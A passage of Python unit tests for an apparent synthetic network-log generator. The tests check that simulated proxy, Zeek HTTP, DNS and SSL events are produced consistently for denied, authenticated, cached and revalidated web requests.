    def test_denied_connect_uses_proxy_error_accounting(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="client-tap",
                    monitoring_segments=["workstations"],
                    direction="outbound",
                    log_formats=["zeek"],
                )
            ]
        )
        generator._build_proxy_context = Mock(
            return_value=ProxyContext(
                client_ip="10.0.1.10",
                method="CONNECT",
                url="example.com:443",
                host="example.com",
                status_code=403,
                tunnel_status_code=403,
                sc_bytes=2_500_000,
                cs_bytes=900_000,
                time_taken=83_948,
                user_agent="Mozilla/5.0",
                content_type="text/html",
                cache_result="DENIED",
                referrer="-",
                proxy_fqdn="PROXY-01.example.org",
            )
        )

        generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="93.184.216.34",
            time=datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC),
            dst_port=443,
            proto="tcp",
            service="ssl",
            duration=90.0,
            orig_bytes=900_000,
            resp_bytes=2_500_000,
            source_system=generator._ip_to_system["10.0.1.10"],
            hostname="example.com",
            conn_state="SF",
        )

        proxy_event = emitters["proxy_access"].emit.call_args.args[0]
        assert proxy_event.proxy.status_code == 403
        assert proxy_event.proxy.tunnel_status_code == 403
        assert proxy_event.proxy.cs_bytes < 1000
        assert proxy_event.proxy.sc_bytes < 2500
        assert proxy_event.proxy.time_taken < 2000
        http_event = emitters["zeek_http"].emit.call_args.args[0]
        assert http_event.http.method == "CONNECT"
        assert http_event.http.status_code == 403
        assert http_event.http.response_body_len == proxy_event.proxy.sc_bytes
        assert ("10.0.3.10", "93.184.216.34", 443) not in _conn_pairs(emitters)

    def test_cache_hit_request_stops_before_origin_side_sources(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="client-tap",
                    monitoring_segments=["workstations"],
                    direction="outbound",
                    log_formats=["zeek"],
                ),
                NetworkSensor(
                    type="network",
                    name="egress-tap",
                    monitoring_segments=["dmz"],
                    direction="outbound",
                    log_formats=["zeek"],
                ),
            ]
        )
        generator._build_proxy_context = Mock(
            return_value=ProxyContext(
                client_ip="10.0.1.10",
                method="GET",
                url="http://example.com/status.gif",
                host="example.com",
                status_code=200,
                sc_bytes=5200,
                cs_bytes=420,
                time_taken=80,
                user_agent="Mozilla/5.0",
                content_type="image/gif",
                cache_result="HIT",
                referrer="-",
                proxy_fqdn="PROXY-01.example.org",
            )
        )

        generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="93.184.216.34",
            time=datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC),
            dst_port=80,
            proto="tcp",
            service="http",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            source_system=generator._ip_to_system["10.0.1.10"],
            hostname="example.com",
            conn_state="SF",
            http=HttpContext(
                method="GET",
                host="example.com",
                uri="/status.gif",
                version="1.1",
                response_body_len=5000,
                status_code=200,
                status_msg="OK",
                resp_mime_types=["image/gif"],
            ),
        )

        pairs = _conn_pairs(emitters)
        assert pairs
        assert all(pair == ("10.0.1.10", "10.0.3.10", 8080) for pair in pairs)
        proxy_event = emitters["proxy_access"].emit.call_args.args[0]
        assert proxy_event.proxy.cache_result == "HIT"
        assert proxy_event.proxy.status_code == 200
        assert emitters["zeek_http"].emit.called
        assert all(
            call.args[0].network.dst_ip == "10.0.3.10"
            for call in emitters["zeek_http"].emit.call_args_list
        )

    def test_cache_hit_proxy_sc_bytes_match_response_plus_overhead(self, monkeypatch):
        import evidenceforge.generation.activity.generator as generator_module

        generator, _ = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="client-tap",
                    monitoring_segments=["workstations"],
                    direction="outbound",
                    log_formats=["zeek"],
                )
            ]
        )
        proxy_system = generator._ip_to_system["10.0.3.10"]

        class FixedRng:
            def random(self) -> float:
                return 0.1

            def randint(self, low: int, high: int) -> int:
                return low

            def choice(self, values):
                return values[0]

        monkeypatch.setattr(generator_module, "_get_rng", lambda: FixedRng())
        monkeypatch.setattr(generator_module, "pick_proxy_domain_user_agent", lambda *a, **k: None)

        proxy_context = generator._build_proxy_context(
            src_ip="10.0.1.10",
            dst_ip="93.184.216.34",
            dst_port=80,
            service="http",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            hostname="example.com",
            source_system=generator._ip_to_system["10.0.1.10"],
            proxy_sys=proxy_system,
            http=HttpContext(
                method="GET",
                host="example.com",
                uri="/status.gif",
                version="1.1",
                user_agent="Mozilla/5.0",
                response_body_len=5000,
                status_code=200,
                status_msg="OK",
                resp_mime_types=["image/gif"],
            ),
            explicit_mode=True,
        )

        assert proxy_context.cache_result == "HIT"
        assert proxy_context.sc_bytes == 5050
        assert proxy_context.cs_bytes == 580

    def test_proxy_304_revalidation_keeps_object_mime_and_cache_label(self, monkeypatch):
        import evidenceforge.generation.activity.generator as generator_module

        generator, _ = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="client-tap",
                    monitoring_segments=["workstations"],
                    direction="outbound",
                    log_formats=["zeek"],
                )
            ]
        )
        proxy_system = generator._ip_to_system["10.0.3.10"]

        class FixedRng:
            def random(self) -> float:
                return 0.8

            def randint(self, low: int, high: int) -> int:
                return low

            def choice(self, values):
                return values[0]

            def uniform(self, low: float, _high: float) -> float:
                return low

        monkeypatch.setattr(generator_module, "_get_rng", lambda: FixedRng())
        monkeypatch.setattr(generator_module, "pick_proxy_domain_user_agent", lambda *a, **k: None)

        proxy_context = generator._build_proxy_context(
            src_ip="10.0.1.10",
            dst_ip="93.184.216.34",
            dst_port=443,
            service="ssl",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=0,
            hostname="cdn.example.com",
            source_system=generator._ip_to_system["10.0.1.10"],
            proxy_sys=proxy_system,
            http=HttpContext(
                method="GET",
                host="cdn.example.com",
                uri="/assets/app.bundle.js",
                version="1.1",
                user_agent="Mozilla/5.0",
                response_body_len=0,
                status_code=304,
                status_msg="Not Modified",
                resp_mime_types=[],
            ),
            explicit_mode=True,
        )

        assert proxy_context.status_code == 304
        assert proxy_context.cache_result == "REVALIDATED"
        assert proxy_context.content_type == "application/javascript"
        assert proxy_context.sc_bytes == 50

    def test_proxy_304_revalidation_is_not_gated_by_cacheable_mime(self):
        generator, _ = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="client-tap",
                    monitoring_segments=["workstations"],
                    direction="outbound",
                    log_formats=["zeek"],
                )
            ]
        )
        proxy_system = generator._ip_to_system["10.0.3.10"]

        proxy_context = generator._build_proxy_context(
            src_ip="10.0.1.10",
            dst_ip="13.107.6.171",
            dst_port=443,
            service="ssl",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=0,
            hostname="res.cdn.office.net",
            source_system=generator._ip_to_system["10.0.1.10"],
            proxy_sys=proxy_system,
            http=HttpContext(
                method="GET",
                host="res.cdn.office.net",
                uri="/",
                version="1.1",
                user_agent="Mozilla/5.0",
                response_body_len=0,
                status_code=304,
                status_msg="Not Modified",
                resp_mime_types=["text/html"],
            ),
            explicit_mode=True,
        )

        assert proxy_context.status_code == 304
        assert proxy_context.cache_result == "REVALIDATED"
        assert proxy_context.content_type == "text/html"

    def test_proxy_304_revalidation_keeps_origin_and_omits_zeek_response_mime(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="both-sides",
                    monitoring_segments=["workstations", "dmz"],
                    direction="bidirectional",
                    log_formats=["zeek"],
                )
            ]
        )

        generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="93.184.216.34",
            time=datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC),
            dst_port=443,
            proto="tcp",
            service="ssl",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=0,
            source_system=generator._ip_to_system["10.0.1.10"],
            hostname="cdn.example.com",
            conn_state="SF",
            http=HttpContext(
                method="GET",
                host="cdn.example.com",
                uri="/assets/app.bundle.js",
                version="1.1",
                user_agent="Mozilla/5.0",
                response_body_len=0,
                status_code=304,
                status_msg="Not Modified",
                resp_mime_types=[],
            ),
        )

        origin_ip = resolve_domain_ip("cdn.example.com", src_host="PROXY-01")
        proxy_event = emitters["proxy_access"].emit.call_args.args[0]
        assert proxy_event.proxy.status_code == 304
        assert proxy_event.proxy.cache_result == "REVALIDATED"
        assert proxy_event.proxy.content_type == "application/javascript"
        assert ("10.0.3.10", origin_ip, 443) in _conn_pairs(emitters)

        http_events = [
            call.args[0]
            for call in emitters["zeek_http"].emit.call_args_list
            if call.args[0].http.uri == "/assets/app.bundle.js"
        ]
        assert len(http_events) == 1
        assert all(event.http.status_code == 304 for event in http_events)
        assert all(event.http.response_body_len == 0 for event in http_events)
        assert all(event.http.resp_mime_types == [] for event in http_events)

    def test_supplied_http_user_agent_survives_domain_override(self, monkeypatch):
        """Proxy context must preserve caller-owned request metadata for correlated egress."""
        import evidenceforge.generation.activity.generator as generator_module

        generator, _ = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="client-tap",
                    monitoring_segments=["workstations"],
                    direction="outbound",
                    log_formats=["zeek"],
                )
            ]
        )
        proxy_system = generator._ip_to_system["10.0.3.10"]
        monkeypatch.setattr(
            generator_module,
            "pick_proxy_domain_user_agent",
            lambda *a, **k: "python-requests/2.31.0",
        )

        proxy_context = generator._build_proxy_context(
            src_ip="10.0.1.10",
            dst_ip="93.184.216.34",
            dst_port=443,
            service="ssl",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            hostname="example.com",
            source_system=generator._ip_to_system["10.0.1.10"],
            proxy_sys=proxy_system,
            http=HttpContext(
                method="GET",
                host="example.com",
                uri="/portal",
                version="1.1",
                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                response_body_len=5000,
                status_code=200,
                status_msg="OK",
                resp_mime_types=["text/html"],
            ),
            explicit_mode=True,
        )

        assert proxy_context.user_agent == "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

    def test_auth_required_connect_stops_before_origin_side_sources(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="both-sides",
                    monitoring_segments=["workstations", "dmz"],
                    direction="bidirectional",
                    log_formats=["zeek"],
                )
            ]
        )
        generator._build_proxy_context = Mock(
            return_value=ProxyContext(
                client_ip="10.0.1.10",
                method="CONNECT",
                url="example.com:443",
                host="example.com",
                status_code=407,
                sc_bytes=700,
                cs_bytes=320,
                time_taken=250,
                user_agent="Mozilla/5.0",
                content_type="text/html",
                cache_result="AUTH_REQUIRED",
                referrer="-",
                proxy_fqdn="PROXY-01.example.org",
            )
        )

        generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="93.184.216.34",
            time=datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC),
            dst_port=443,
            proto="tcp",
            service="ssl",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            source_system=generator._ip_to_system["10.0.1.10"],
            hostname="example.com",
            conn_state="SF",
        )

        pairs = _conn_pairs(emitters)
        assert ("10.0.1.10", "10.0.3.10", 8080) in pairs
        assert ("10.0.3.10", "93.184.216.34", 443) not in pairs
        proxy_event = emitters["proxy_access"].emit.call_args.args[0]
        assert proxy_event.proxy.status_code == 407
        http_event = emitters["zeek_http"].emit.call_args.args[0]
        assert http_event.http.method == "CONNECT"
        assert http_event.http.status_code == 407
        assert http_event.http.request_body_len == 0
        assert http_event.http.response_body_len == proxy_event.proxy.sc_bytes
        assert not emitters["zeek_ssl"].emit.called

    def test_supplied_denied_proxy_context_stops_before_origin_side_sources(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="both-sides",
                    monitoring_segments=["workstations", "dmz"],
                    direction="bidirectional",
                    log_formats=["zeek"],
                )
            ]
        )

        generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="93.184.216.34",
            time=datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC),
            dst_port=443,
            proto="tcp",
            service="ssl",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            source_system=generator._ip_to_system["10.0.1.10"],
            hostname="example.com",
            conn_state="SF",
            proxy=ProxyContext(
                client_ip="10.0.1.10",
                method="CONNECT",
                url="example.com:443",
                host="example.com",
                status_code=403,
                sc_bytes=700,
                cs_bytes=320,
                time_taken=250,
                user_agent="Mozilla/5.0",
                content_type="text/html",
                cache_result="DENIED",
                referrer="-",
                proxy_fqdn="PROXY-01.example.org",
            ),
        )

        pairs = _conn_pairs(emitters)
        assert ("10.0.1.10", "10.0.3.10", 8080) in pairs
        assert ("10.0.3.10", "93.184.216.34", 443) not in pairs
        proxy_event = emitters["proxy_access"].emit.call_args.args[0]
        assert proxy_event.proxy.status_code == 403
        assert not emitters["zeek_ssl"].emit.called

    def test_failed_connect_status_messages_are_status_specific(self):
        from evidenceforge.generation.activity.network_params import proxy_connect_status_messages

        configured_messages = proxy_connect_status_messages()
        for status_code in (407, 502, 503, 504):
            generator, emitters = _generator(
                [
                    NetworkSensor(
                        type="network",
                        name="both-sides",
                        monitoring_segments=["workstations", "dmz"],
                        direction="bidirectional",
                        log_formats=["zeek"],
                    )
                ]
            )
            cache_result = "AUTH_REQUIRED" if status_code == 407 else "GATEWAY_ERROR"

            generator.generate_connection(
                src_ip="10.0.1.10",
                dst_ip="93.184.216.34",
                time=datetime(2024, 1, 15, 10, status_code % 60, 0, tzinfo=UTC),
                dst_port=443,
                proto="tcp",
                service="ssl",
                duration=1.0,
                orig_bytes=500,
                resp_bytes=5000,
                source_system=generator._ip_to_system["10.0.1.10"],
                hostname="example.com",
                conn_state="SF",
                proxy=ProxyContext(
                    client_ip="10.0.1.10",
                    method="CONNECT",
                    url="example.com:443",
                    host="example.com",
                    status_code=status_code,
                    sc_bytes=700,
                    cs_bytes=320,
                    time_taken=250,
                    user_agent="Mozilla/5.0",
                    content_type="text/html",
                    cache_result=cache_result,
                    referrer="-",
                    proxy_fqdn="PROXY-01.example.org",
                ),
            )

            http_event = emitters["zeek_http"].emit.call_args.args[0]
            proxy_event = emitters["proxy_access"].emit.call_args.args[0]
            assert http_event.http.status_code == status_code
            assert http_event.http.status_msg in configured_messages[status_code]
            assert http_event.http.status_msg != "Proxy Error"
            assert http_event.http.response_body_len == proxy_event.proxy.sc_bytes
            assert not emitters["zeek_ssl"].emit.called

    def test_port_only_web_connection_resolves_origin_from_proxy(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="client-tap",
                    monitoring_segments=["workstations"],
                    direction="outbound",
                    log_formats=["zeek"],
                ),
                NetworkSensor(
                    type="network",
                    name="egress-tap",
                    monitoring_segments=["dmz"],
                    direction="outbound",
                    log_formats=["zeek"],
                ),
            ]
        )
        generator._dns_server_ips = ["10.0.0.1"]

        generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="10.0.0.1",
            time=datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC),
            dst_port=443,
            proto="tcp",
            service=None,
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            source_system=generator._ip_to_system["10.0.1.10"],
            hostname="example.com",
            emit_dns=True,
            conn_state="SF",
        )

        pairs = _conn_pairs(emitters)
        assert ("10.0.1.10", "10.0.3.10", 8080) in pairs
        origin_pairs = [pair for pair in pairs if pair[0] == "10.0.3.10" and pair[2] == 443]
        assert origin_pairs
        assert all(pair[1] != "10.0.0.1" for pair in origin_pairs)
        assert all(pair[0] != "10.0.1.10" or pair[1] == "10.0.3.10" for pair in pairs)
        dns_events = [call.args[0] for call in emitters["zeek_dns"].emit.call_args_list]
        assert dns_events
        assert all(event.network.src_ip == "10.0.3.10" for event in dns_events)
        assert all(event.network.dst_ip == "10.0.0.1" for event in dns_events)
        assert all("10.0.0.1" not in event.dns.answers for event in dns_events)
        assert all(event.dns.query != "PROXY-01.example.org" for event in dns_events)
        assert any(event.dns.query == "example.com" for event in dns_events)

    def test_private_destination_without_hostname_does_not_invent_public_dns(self):
        from evidenceforge.generation.activity.network import REVERSE_DNS

        workstation = _system("WKS-01", "10.0.1.10")
        state_manager = StateManager()
        state_manager.set_current_time(datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC))
        emitters = _emitters()
        generator = ActivityGenerator(state_manager, emitters)
        generator._ip_to_system = {workstation.ip: workstation}
        generator._dns_server_ips = ["10.0.0.1"]
        generator._ad_domain = "example.org"

        previous_reverse = REVERSE_DNS.pop("10.0.0.1", None)
        try:
            generator.generate_connection(
                src_ip="10.0.1.10",
                dst_ip="10.0.0.1",
                time=datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC),
                dst_port=443,
                proto="tcp",
                service=None,
                duration=1.0,
                orig_bytes=500,
                resp_bytes=5000,
                source_system=workstation,
                emit_dns=True,
                conn_state="SF",
            )
        finally:
            if previous_reverse is None:
                REVERSE_DNS.pop("10.0.0.1", None)
            else:
                REVERSE_DNS["10.0.0.1"] = previous_reverse

        dns_events = [call.args[0] for call in emitters["zeek_dns"].emit.call_args_list]
        assert dns_events
        assert all(event.network.src_ip == "10.0.1.10" for event in dns_events)
        queries = {event.dns.query for event in dns_events}
        assert any(query.endswith(".example.org") for query in queries)
        assert not any(
            public_hint in query
            for query in queries
            for public_hint in ("hotjar", "hubspot", "amplitude", "intercom", "linkedin")
        )

    def test_established_ssl_connection_always_has_ssl_context(self):
        state_manager = StateManager()
        state_manager.set_current_time(datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC))
        emitters = _emitters()
        generator = ActivityGenerator(state_manager, emitters)

        generator.generate_connection(
            src_ip="10.0.3.10",
            dst_ip="93.184.216.34",
            time=datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC),
            dst_port=443,
            proto="tcp",
            service="ssl",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            hostname="example.com",
            conn_state="S0",
            http=HttpContext(
                method="GET",
                host="example.com",
                uri="/",
                version="1.1",
                status_code=200,
                status_msg="OK",
            ),
        )

        conn_event = emitters["zeek_conn"].emit.call_args.args[0]
        assert conn_event.network.conn_state == "SF"
        assert conn_event.network.orig_bytes > 0
        assert conn_event.network.resp_bytes > 0
        assert conn_event.network.orig_pkts > 0
        assert conn_event.network.resp_pkts > 0
        assert conn_event.ssl is not None
        assert conn_event.ssl.established is True
        assert conn_event.x509 is not None
        assert conn_event.x509_chain[0] is conn_event.x509
        assert conn_event.ssl.cert_chain_fuids == [cert.fuid for cert in conn_event.x509_chain]
